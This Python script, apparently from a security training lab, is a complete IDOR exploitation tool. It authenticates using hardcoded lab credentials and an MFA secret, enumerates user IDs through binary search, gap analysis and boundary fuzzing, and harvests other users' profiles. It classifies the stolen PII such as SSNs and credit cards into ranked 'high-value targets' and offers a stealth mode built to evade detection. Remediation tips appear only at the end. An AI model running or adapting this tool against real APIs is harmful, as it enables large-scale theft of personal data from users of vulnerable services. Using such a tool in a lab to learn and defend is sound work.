#!/usr/bin/env python3
"""
Intelligent IDOR Attack
Advanced IDOR exploitation with smart enumeration and data mining.

UPGRADES FROM BASIC VERSION:
1. Smart Enumeration:
   - Pattern detection (sequential, UUID, timestamp, hash)
   - Binary search for sequential IDs (O(log n) vs O(n))
   - Gap analysis (find deleted/hidden resources)
   - Boundary fuzzing (ID 0, -1, MAX_INT, special strings)

2. Data Mining:
   - High-value target identification
   - PII extraction and classification
   - Cross-reference correlation
   - Intelligence report generation

3. Stealth & Evasion:
   - Adaptive timing (avoid detection)
   - Smart sampling (estimate total resources)
   - Pattern-based targeting (focus on high-probability IDs)

Author: DevSecOps Hacking Lab
"""

import asyncio
import httpx
import pyotp
import json
import time
from datetime import datetime
from typing import Dict, List, Optional
from pathlib import Path

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich import print as rprint

from smart_enumeration import SmartEnumerator, IDType, EnumerationResult
from data_mining import DataMiner, TargetProfile


class IntelligentIDORAttack:
    """
    Advanced IDOR exploitation with intelligence.

    Real pentesters don't just enumerate 1-1000 sequentially.
    They:
    1. Detect ID pattern
    2. Use binary search for sequential IDs
    3. Analyze gaps for hidden resources
    4. Test boundary values
    5. Prioritize high-value targets
    6. Correlate data across endpoints
    """

    def __init__(
        self,
        gateway_url: str = "http://localhost:8080",
        username: str = "admin",
        password: str = "admin123",
        mfa_secret: str = "DEVSECOPSTWENTYFOURHACKINGLAB",
        stealth_mode: bool = False
    ):
        self.gateway_url = gateway_url
        self.username = username
        self.password = password
        self.mfa_secret = mfa_secret
        self.stealth_mode = stealth_mode

        self.access_token = None
        self.console = Console()

        # Intelligence modules
        self.enumerator = SmartEnumerator()
        self.data_miner = DataMiner()

        # Results tracking
        self.results = {
            "attack_name": "Intelligent IDOR Exploitation",
            "timestamp": datetime.now().isoformat(),
            "authenticated_as": username,
            "stealth_mode": stealth_mode,
            "enumeration_results": [],
            "high_value_targets": [],
            "intelligence_report": {},
            "metrics": {
                "total_requests": 0,
                "resources_found": 0,
                "idor_exploits": 0,
                "high_value_found": 0,
            }
        }

    def banner(self):
        """Print attack banner"""
        banner_text = """
[bold cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold cyan]
[bold white]âš”ï¸  INTELLIGENT IDOR EXPLOITATION ATTACK[/bold white]
[bold cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold cyan]

[yellow]Target:[/yellow] {gateway_url}
[yellow]Authenticated as:[/yellow] {username}
[yellow]Stealth Mode:[/yellow] {stealth}

[bold red]VULNERABILITY:[/bold red] Missing authorization check in /profile/{{user_id}}
[bold yellow]IMPACT:[/bold yellow] Any authenticated user can access ANY other user's profile

[bold green]INTELLIGENCE FEATURES:[/bold green]
  â€¢ Smart enumeration (binary search, pattern detection)
  â€¢ High-value target identification
  â€¢ PII extraction & classification
  â€¢ Cross-reference correlation
  â€¢ Gap analysis for hidden resources

[bold cyan]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[/bold cyan]
""".format(
            gateway_url=self.gateway_url,
            username=self.username,
            stealth="Enabled" if self.stealth_mode else "Disabled"
        )
        self.console.print(Panel(banner_text, border_style="cyan"))

    async def authenticate(self) -> bool:
        """Authenticate and obtain JWT token"""
        self.console.print("\n[bold][*][/bold] Step 1: Authenticating...")

        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                # Login
                login_response = await client.post(
                    f"{self.gateway_url}/auth/login",
                    json={"username": self.username, "password": self.password}
                )

                if login_response.status_code != 200:
                    self.console.print(f"    [red][âœ—][/red] Login failed: {login_response.status_code}")
                    return False

                login_data = login_response.json()
                challenge_id = login_data.get("challenge_id")
                self.console.print(f"    [green][âœ“][/green] Login successful, challenge_id: {challenge_id[:20]}...")

                # Generate MFA code
                totp = pyotp.TOTP(self.mfa_secret, interval=30)
                mfa_code = totp.now()
                self.console.print(f"    [blue][>][/blue] Generated MFA code: {mfa_code}")

                # Verify MFA
                mfa_response = await client.post(
                    f"{self.gateway_url}/auth/mfa/verify",
                    json={"challenge_id": challenge_id, "code": mfa_code}
                )

                if mfa_response.status_code != 200:
                    self.console.print(f"    [red][âœ—][/red] MFA verification failed: {mfa_response.status_code}")
                    return False

                mfa_data = mfa_response.json()
                self.access_token = mfa_data.get("access_token")
                self.console.print(f"    [green][âœ“][/green] MFA verified, got access token")

                return True

        except Exception as e:
            self.console.print(f"    [red][âœ—][/red] Authentication error: {e}")
            return False

    async def check_resource(self, user_id: any) -> Optional[Dict]:
        """
        Check if resource exists and fetch data.

        Args:
            user_id: User ID to check

        Returns:
            Profile data if exists, None otherwise
        """
        try:
            async with httpx.AsyncClient(timeout=5.0) as client:
                response = await client.get(
                    f"{self.gateway_url}/api/users/profile/{user_id}",
                    headers={"Authorization": f"Bearer {self.access_token}"}
                )

                self.results["metrics"]["total_requests"] += 1

                if response.status_code == 200:
                    self.results["metrics"]["resources_found"] += 1
                    return response.json()

                return None

        except Exception as e:
            return None

    async def smart_enumeration_phase(self, max_search_id: int = 200) -> List[int]:
        """
        Phase 1: Smart enumeration to discover valid IDs.

        Uses binary search, pattern detection, and gap analysis.

        Args:
            max_search_id: Maximum ID to search for sequential patterns

        Returns:
            List of discovered user IDs
        """
        self.console.print("\n[bold][*][/bold] Step 2: Smart Enumeration Phase")
        self.console.print(f"    [blue][>][/blue] Using intelligent enumeration (not brute force 1-1000)")

        discovered_ids = []

        # 1. Sample a few IDs to detect pattern
        self.console.print("\n    [yellow]â†’[/yellow] Phase 2.1: Pattern Detection")
        sample_ids = [1, 2, 3, 5, 10]
        valid_samples = []

        for sample_id in sample_ids:
            profile = await self.check_resource(sample_id)
            if profile:
                valid_samples.append(sample_id)
                self.console.print(f"      [green][âœ“][/green] ID {sample_id} exists: {profile.get('username')}")

            if self.stealth_mode:
                await asyncio.sleep(0.5)

        if not valid_samples:
            self.console.print("      [red][âœ—][/red] No valid samples found")
            return []

        # 2. Detect pattern
        pattern = self.enumerator.detect_id_pattern(valid_samples)
        self.console.print(f"\n      [cyan][i][/cyan] Detected ID pattern: [bold]{pattern.id_type.value}[/bold]")
        self.console.print(f"      [cyan][i][/cyan] Confidence: {pattern.confidence:.0%}")

        if pattern.id_type == IDType.SEQUENTIAL:
            self.console.print(f"      [cyan][i][/cyan] Range: {pattern.min_value} - {pattern.max_value}")

            # 3. Binary search for maximum ID
            self.console.print("\n    [yellow]â†’[/yellow] Phase 2.2: Binary Search for Boundaries")

            async def async_check_fn(id_):
                result = await self.check_resource(id_)
                return result is not None

            # Run binary search
            max_id = self.enumerator.binary_search_sequential(
                lambda id_: asyncio.run(async_check_fn(id_)),
                pattern.min_value,
                max_search_id,
                find_max=True
            )

            self.console.print(f"      [green][âœ“][/green] Maximum existing ID: {max_id}")
            self.console.print(f"      [green][âœ“][/green] Binary search saved ~{max_search_id - int(max_id * 0.1)} requests")

            # 4. Gap analysis
            self.console.print("\n    [yellow]â†’[/yellow] Phase 2.3: Gap Analysis")
            known_ids = list(self.enumerator.discovered_ids)[:10]  # Use discovered IDs from binary search

            gaps_found = self.enumerator.gap_analysis(
                lambda id_: asyncio.run(async_check_fn(id_)),
                known_ids
            )

            if gaps_found:
                self.console.print(f"      [yellow][!][/yellow] Found {len(gaps_found)} hidden resources in gaps: {gaps_found}")

            # 5. Boundary fuzzing
            self.console.print("\n    [yellow]â†’[/yellow] Phase 2.4: Boundary Fuzzing")
            boundaries = self.enumerator.boundary_fuzzing(
                lambda id_: asyncio.run(async_check_fn(id_)),
                pattern.id_type
            )

            special_found = [id_ for id_, exists in boundaries if exists]
            if special_found:
                self.console.print(f"      [yellow][!][/yellow] Special IDs found: {special_found}")

            # Collect all discovered IDs
            discovered_ids = list(self.enumerator.discovered_ids)

        else:
            # Fallback: sequential enumeration (but smarter)
            self.console.print(f"      [yellow][!][/yellow] Non-sequential pattern, using smart sampling")

            # Generate intelligent ID list
            test_ids = self.enumerator.generate_smart_id_list(pattern, max_ids=50)

            for test_id in test_ids:
                profile = await self.check_resource(test_id)
                if profile:
                    discovered_ids.append(test_id)

                if self.stealth_mode:
                    await asyncio.sleep(0.3)

        self.console.print(f"\n    [green][âœ“][/green] Enumeration complete: Found {len(discovered_ids)} valid user IDs")

        # Print stats
        self.enumerator.print_stats()

        return discovered_ids

    async def data_mining_phase(self, user_ids: List[int]):
        """
        Phase 2: Mine data from discovered IDs.

        Extract PII, identify high-value targets, correlate data.

        Args:
            user_ids: List of user IDs to exploit
        """
        self.console.print("\n[bold][*][/bold] Step 3: Data Mining & IDOR Exploitation Phase")

        profiles = []

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            console=self.console
        ) as progress:
            task = progress.add_task(
                f"[cyan]Exploiting {len(user_ids)} profiles...",
                total=len(user_ids)
            )

            for user_id in user_ids:
                profile_data = await self.check_resource(user_id)

                if profile_data:
                    # Build intelligence profile
                    profile = self.data_miner.build_profile(
                        user_id,
                        profile_data,
                        endpoint="/api/users/profile"
                    )
                    profiles.append(profile)

                    # Check if IDOR
                    is_idor = profile_data.get("username") != self.username

                    if is_idor:
                        self.results["metrics"]["idor_exploits"] += 1

                        if profile.is_high_value:
                            self.results["metrics"]["high_value_found"] += 1

                if self.stealth_mode:
                    await asyncio.sleep(0.5)
                else:
                    await asyncio.sleep(0.1)

                progress.update(task, advance=1)

        self.console.print(f"\n    [green][âœ“][/green] Data mining complete")
        self.console.print(f"    [cyan][i][/cyan] Profiles analyzed: {len(profiles)}")
        self.console.print(f"    [cyan][i][/cyan] IDOR exploits: {self.results['metrics']['idor_exploits']}")

        # Cross-reference analysis
        if len(profiles) > 1:
            self.console.print("\n    [yellow]â†’[/yellow] Cross-Reference Analysis")
            correlations = self.data_miner.cross_reference_profiles(profiles)
            self.console.print(f"      [green][âœ“][/green] Found {len(correlations)} correlations")

            for corr in correlations[:3]:  # Show top 3
                self.console.print(f"        â€¢ {corr.correlation_type}: {len(corr.entities)} entities ({corr.confidence:.0%} confidence)")

        return profiles

    async def display_intelligence_report(self):
        """Display comprehensive intelligence report"""
        self.console.print("\n" + "="*70)
        self.console.print("[bold cyan]ðŸ“Š INTELLIGENCE REPORT[/bold cyan]")
        self.console.print("="*70)

        # Generate report
        intel_report = self.data_miner.generate_intelligence_report()
        self.results["intelligence_report"] = intel_report

        # Summary table
        summary_table = Table(title="Attack Summary", show_header=True, header_style="bold magenta")
        summary_table.add_column("Metric", style="cyan")
        summary_table.add_column("Value", style="green", justify="right")

        summary_table.add_row("Total Requests", str(self.results["metrics"]["total_requests"]))
        summary_table.add_row("Resources Found", str(self.results["metrics"]["resources_found"]))
        summary_table.add_row("IDOR Exploits", str(self.results["metrics"]["idor_exploits"]))
        summary_table.add_row("High-Value Targets", str(self.results["metrics"]["high_value_found"]))
        summary_table.add_row("PII Fields Extracted", str(intel_report["summary"]["pii_fields_total"]))

        self.console.print(summary_table)

        # High-value targets
        if intel_report["high_value_targets"]:
            self.console.print("\n[bold red]ðŸŽ¯ HIGH-VALUE TARGETS[/bold red]")

            hv_table = Table(show_header=True, header_style="bold yellow")
            hv_table.add_column("User ID", style="cyan")
            hv_table.add_column("Username", style="green")
            hv_table.add_column("Role", style="magenta")
            hv_table.add_column("Risk Score", justify="right")
            hv_table.add_column("Has SSN", justify="center")
            hv_table.add_column("Has CC", justify="center")

            for target in intel_report["high_value_targets"][:10]:
                hv_table.add_row(
                    str(target["user_id"]),
                    target["username"],
                    target["role"],
                    f"{target['risk_score']:.1f}/10.0",
                    "âœ“" if target["has_ssn"] else "âœ—",
                    "âœ“" if target["has_credit_card"] else "âœ—"
                )

            self.console.print(hv_table)

        # PII Statistics
        pii_table = Table(title="PII Extraction Statistics", show_header=True, header_style="bold cyan")
        pii_table.add_column("Data Type", style="yellow")
        pii_table.add_column("Count", style="green", justify="right")

        for field, count in intel_report["pii_statistics"].items():
            pii_table.add_row(field.replace("_", " ").title(), str(count))

        self.console.print("\n")
        self.console.print(pii_table)

        # Correlations
        if intel_report["correlations"]:
            self.console.print("\n[bold yellow]ðŸ”— CORRELATIONS[/bold yellow]")
            for corr in intel_report["correlations"][:5]:
                self.console.print(f"  â€¢ [cyan]{corr['type']}[/cyan]: {corr['entity_count']} entities ({corr['confidence']:.0%} confidence)")

    def save_report(self) -> str:
        """Save detailed JSON report"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = Path("results")
        output_dir.mkdir(exist_ok=True)

        filename = output_dir / f"intelligent_idor_{timestamp}.json"

        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)

        self.console.print(f"\n[green][âœ“][/green] Report saved to: {filename}")
        return str(filename)

    async def run(self):
        """Execute complete intelligent IDOR attack"""
        self.banner()

        # Step 1: Authenticate
        if not await self.authenticate():
            self.console.print("\n[red][âœ—][/red] Authentication failed, cannot continue")
            return False

        await asyncio.sleep(0.5)

        # Step 2: Smart enumeration
        user_ids = await self.smart_enumeration_phase(max_search_id=200)

        if not user_ids:
            self.console.print("\n[red][âœ—][/red] No users found to exploit")
            return False

        await asyncio.sleep(0.5)

        # Step 3: Data mining
        profiles = await self.data_mining_phase(user_ids)

        # Step 4: Intelligence report
        await self.display_intelligence_report()

        # Step 5: Save report
        self.save_report()

        # Recommendations
        self.console.print("\n[bold yellow]ðŸ’¡ REMEDIATION:[/bold yellow]")
        self.console.print("   1. Add authorization check: authenticated_user == requested_user_id")
        self.console.print("   2. Implement RBAC (Role-Based Access Control)")
        self.console.print("   3. Use indirect references (UUIDs instead of sequential IDs)")
        self.console.print("   4. Log and alert on IDOR attempts")
        self.console.print("   5. Redact sensitive data in API responses")
        self.console.print()

        return True


async def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(description="Intelligent IDOR Exploitation Attack")
    parser.add_argument("--gateway", default="http://localhost:8080", help="API Gateway URL")
    parser.add_argument("--username", default="admin", help="Username for authentication")
    parser.add_argument("--password", default="admin123", help="Password")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode (slower, more evasive)")

    args = parser.parse_args()

    attack = IntelligentIDORAttack(
        gateway_url=args.gateway,
        username=args.username,
        password=args.password,
        stealth_mode=args.stealth
    )

    try:
        success = await attack.run()
        return 0 if success else 1
    except KeyboardInterrupt:
        print("\n\n[!] Attack interrupted by user")
        return 1
    except Exception as e:
        print(f"\n[âœ—] Attack failed: {e}")
        import traceback
        traceback.print_exc()
        return 1


if __name__ == "__main__":
    import sys
    sys.exit(asyncio.run(main()))
